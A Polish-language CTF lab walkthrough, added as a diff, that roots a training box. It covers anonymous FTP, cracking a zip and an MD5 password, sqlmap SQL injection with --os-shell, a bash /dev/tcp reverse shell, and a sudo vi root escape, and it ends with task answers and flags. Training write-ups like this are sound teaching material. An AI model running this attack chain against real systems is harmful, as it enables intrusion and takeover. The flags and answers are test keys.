@@ -1,0 +1,58 @@
+nmap -sC -sV -p- TARGET.IP -> otwarte porty 21/ftp, 22/ssh, 80 http, logowanie anonymous na ftp dozwolone
+na serwerze ftp znajduje sie plik backup.zip ktory jest zabezpieczony haslem
+do zlamania hasla uzyjemy narzedzia john the ripper
+musimy zamienic plik backup.zip na hash modulem johna:
+zip2john backup.zip > backuphash
+nastepnie: john -wordlist=/usr/share/wordlists/rockyou.txt backuphash
+john --show backuphash: haslo 741852963.
+rozpakowujemy plik backup.zip i otrzymujemy dwa kolejne pliki tj: index.php i style.ccs
+open index.php -> znajdujemy user: admin, password: 2cb42f8734ea607eefed3b70af13bbd3
+w tym samym pliku widzimy rowniez ze haslo jest zaszyfrowane w md5
+do zlamania hasla uzylem crackstation.net ->qwerty789
+po zalogowaniu sie do panelu admina widzimy katalog/wyszukiwarke ktora moze byc podatna na sqlinjecton. sprawdzamy to za pomoca narzedzia sqlmap.
+uzywamy skladni: 
+sqlmap -u 'http://TARGET.IP/dashboard.php?search=test' --
+cookie="PHPSESSID=idsesji .
+PHPSESSID przechwytujemy w burpie
+widzimy ze strona jest podatna na sql injection. uzywamy flagi --os-shell.
+nasluchujemy za pomoca nc -lvnp 12345
+nastepnie payload: bash -c "bash -i >& /dev/tcp/IP/12345 0>&1"
+stabilny shell - > python3 -c 'import pty;pty.spawn("/bin/bash")'
+w folderze /var/lib/postgresql znajduje flage user.txt: ec9b13ca4d6229cd5cc1e09980965bf7
+w folderze /var/www/html znajduje sie plik dashboard.php w ktorym mozemy znalezc haslo dla uzytkownika postgresql : P@s5w0rd!
+Probujemy zalogowac sie na ssh ktore wczesniej odkrylismy -> sukces
+sprawdzamy 
+w folderze /var/lib/postgresql znajduje flage user.txt: jakie mamy uprawnienia -> sudo -l     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+komenda: vi -c ':!/bin/sh' /dev/null nie dziala , probujemy innej metody
+vi -c 
+:set shell=/bin/sh 
+:shell
+dostajemy roota!
+cd /root
+cat root.txt
+flaga: dd6e058e814260bc70e9bbdef2715849
+
+Task 1:
+Besides SSH and HTTP, what other service is hosted on this box?
+FTP
+Task 2:
+This service can be configured to allow login with any password for specific username. What is that username?
+anonymous
+Task 3:
+What is the name of the file downloaded over this service?
+backup.zip
+Task 4:
+What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
+zip2john
+Task 5:
+What is the password for the admin user on the website?
+qwerty789
+Task 6:
+What option can be passed to sqlmap to try to get command execution via the sql injection?
+-os-shell
+What program can the postgres user run as root using sudo?
+vi
+user flag: 
+ec9b13ca4d6229cd5cc1e09980965bf7
+root flag:
+dd6e058e814260bc70e9bbdef2715849
